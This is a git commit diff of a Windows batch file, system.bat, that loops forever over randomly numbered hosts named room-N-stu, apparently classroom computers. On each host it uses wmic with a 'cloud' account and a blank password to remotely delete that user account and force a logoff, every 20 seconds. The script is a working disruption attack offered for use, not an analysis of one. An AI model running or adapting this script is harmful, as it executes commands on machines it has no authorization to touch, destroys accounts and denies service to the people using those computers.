3322de026da9db6e2802ec401dc0a65c3d325a88
sodih3iw <116991585+sodih3iw@users.noreply.github.com>
2026-01-15 22:56:18 +0800

    更新 system.bat

--- system.bat
+++ system.bat
@@ -4,13 +4,15 @@ setlocal enabledelayedexpansion
 ::set i=11
 set /a i=%random% %% 100
 
-:001
-set TARGET=room-%i%-stu
-wmic /node:"%TARGET%" /user:"cloud" /password:"" process call create "cmd /c net user "cloud" /delete&&cmd /c shutdown /l"
-::wmic /node:"%TARGET%" /user:"cloud" /password:"" process call create "cmd /c shutdown /l"
+:loop
+set TARGET=room-!i!-stu
+wmic /node:"!TARGET!" /user:"cloud" /password:"" process call create "cmd /c net user "cloud" /delete&&cmd /c shutdown /l"
+::wmic /node:"!TARGET!" /user:"cloud" /password:"" process call create "cmd /c shutdown /l"
 ::set /a i+=1
 set /a i=%random% %% 100
-if "i" == "72" (
-exit /b 0
-)
-goto 001
+
+::if !i! == 72 (
+::    exit /b 0
+::)
+timeout -t 20
+goto loop
